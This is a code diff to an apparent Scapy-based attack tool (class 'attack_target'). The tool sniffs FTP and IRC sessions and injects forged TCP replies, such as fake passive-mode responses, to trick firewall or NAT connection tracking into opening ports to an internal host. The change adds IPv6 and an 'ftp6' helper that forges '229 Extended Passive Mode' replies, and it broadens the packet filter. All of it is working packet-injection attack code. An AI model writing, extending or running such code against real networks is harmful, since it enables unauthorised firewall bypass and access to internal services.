@@ -30,7 +30,8 @@ class attack_target:
     def __init__(self):
         self.ip = "192.168.2.2"
         self.port = "5432"
-        self.iface="eth0"
+        self.iface = "eth0"
+        self.l3proto = "IPv4"
         self.verbose = False
 
     def build_filter(self):
@@ -54,11 +55,18 @@ class attack_target:
             orig_src = pkt[Ether].src
             orig_dst = pkt[Ether].dst
             # change payload
-            att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
-            att[IP] = pkt[IP]
-            att[IP].id = pkt[IP].id + 1
-            del att[IP].chksum
-            del att[IP].len
+            if self.l3proto == "IPv4":
+                att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IP()/TCP()
+                att[IP] = pkt[IP]
+                att[IP].id = pkt[IP].id + 1
+                del att[IP].chksum
+                del att[IP].len
+            else:
+                att = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src)/IPv6()/TCP()
+                att[IPv6] = pkt[IPv6]
+                del att[IPv6].chksum
+                del att[IPv6].plen
+
             att[TCP].seq = pkt[TCP].seq + len(pkt[TCP].payload)
             del att[TCP].chksum
             att[TCP].payload = self.build_command()
@@ -87,7 +95,7 @@ class ftp_helper(attack_target):
         return "227 Entering Passive Mode (%s,%d,%d)\r\n" % (self.ip.replace('.',','), self.port >> 8 & 0xff, self.port & 0xff)
 
     def build_filter(self):
-        return "tcp and src host %s and src port 21" % (self.ip)
+        return "src host %s and src port 21" % (self.ip)
 
     def inject_condition(self,pkt):
         if re.match("230",pkt.sprintf("%TCP.payload%")):
@@ -118,6 +126,14 @@ class ftp_helper(attack_target):
             sys.exit(0)
         self.cv.wait()
         self.cv.release()
+
+class ftp6_helper(ftp_helper):
+    def __init__(self):
+        ftp_helper.__init__(self)
+        self.l3proto = "IPv6"
+
+    def build_command(self):
+        return "229 Extended Passive Mode OK (|||%d|)\r\n" % (self.port)
         
 class irc_helper(attack_target):
     def ipnumber(self, ip):
@@ -148,6 +164,8 @@ if args.helper == 'ftp':
     target = ftp_helper()
 elif args.helper == 'irc':
     target = irc_helper()
+elif args.helper == 'ftp6':
+    target = ftp6_helper()
 else:
     sys.exit("Selected protocol is currently unsupported")
 
